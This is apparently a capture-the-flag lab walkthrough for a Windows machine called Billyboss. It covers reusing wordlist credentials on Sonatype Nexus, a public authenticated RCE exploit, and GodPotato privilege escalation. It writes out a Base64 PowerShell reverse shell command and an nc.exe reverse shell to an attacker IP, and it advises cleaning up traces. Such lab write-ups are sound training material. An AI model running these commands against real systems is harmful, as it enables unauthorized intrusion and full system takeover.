# 🏴 Billyboss (Windows)

## 🧠 Initial Foothold

- Searched for leaked or default credentials using:

  ```
  grep -r "Sonatype Nexus" /usr/share/wordlists/seclists/Passwords
  ```

- Found valid credentials for the Sonatype Nexus interface.

- Logged in and used the following exploit:  
  **Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)**  
  [Exploit-DB 49385](https://www.exploit-db.com/exploits/49385)

- Adjusted the payload for Windows by using a Base64-encoded PowerShell reverse shell:

  ```powershell
  cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUw...
  ```

- Successfully received a reverse shell on the Windows target.

---

## 🚀 Privilege Escalation

- Checked privileges and noticed `SeImpersonatePrivilege` was enabled.

- Used **GodPotato-NET4** for privilege escalation.

- Transferred `nc.exe` from the Kali machine to the target.

- Executed the following command:

  ```powershell
  .\GodPotato-NET4.exe -cmd "C:\Users\nathan\Desktop\nc.exe -e cmd.exe 192.168.49.140 4444"
  ```

- Successfully gained a reverse shell as **SYSTEM**.

---

🧼 **Post-Exploitation Note:**  
Clean up `nc.exe`, the GodPotato binary, and any reverse shell artifacts.

> ⚠️ This walkthrough is for educational purposes only.
